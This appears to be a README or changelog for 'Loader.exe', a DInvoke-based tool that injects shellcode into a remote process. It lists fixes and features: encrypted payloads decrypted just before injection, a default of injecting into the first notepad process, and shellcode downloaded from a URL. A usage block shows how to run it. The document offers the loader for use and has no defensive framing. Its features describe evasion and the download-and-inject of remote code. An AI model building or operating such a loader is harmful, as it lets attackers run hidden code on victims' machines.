# DInvoke-based remote-process shellcode injector.

1. Sync Main (compiles under classic .NET Framework / mono, no C# 7.1 requirement).

2. --pid option; notepad lookup no longer throws IndexOutOfRangeException.

3. NTSTATUS validated on every Nt* call; failures raise descriptive errors.

4. OBJECT_ATTRIBUTES.Length set to Marshal.SizeOf() (kernel rejects 0-length OA).

5. WriteMemory: unmanaged scratch buffer freed in finally; short-write check.

6. hProcess/hThread closed via custom NtClose delegate (DInvoke ships no NtClose).

7. Download: explicit 30s timeout + HTTP status + empty-body checks.

8. Minimal process access mask with PROCESS_ALL_ACCESS fallback.

9. NtAllocateVirtualMemory regionSize captured by ref (page-rounding).

10. Payload AES-256-CBC encrypted at rest/in transit; decrypted here before injection.

# Usage:

```bash
Loader.exe [--pid <processId>] [--file <path-to-enc-file>]
(no --pid  -> injects into the first "notepad" process)
(no --file -> downloads from ShellcodeUrl)
```
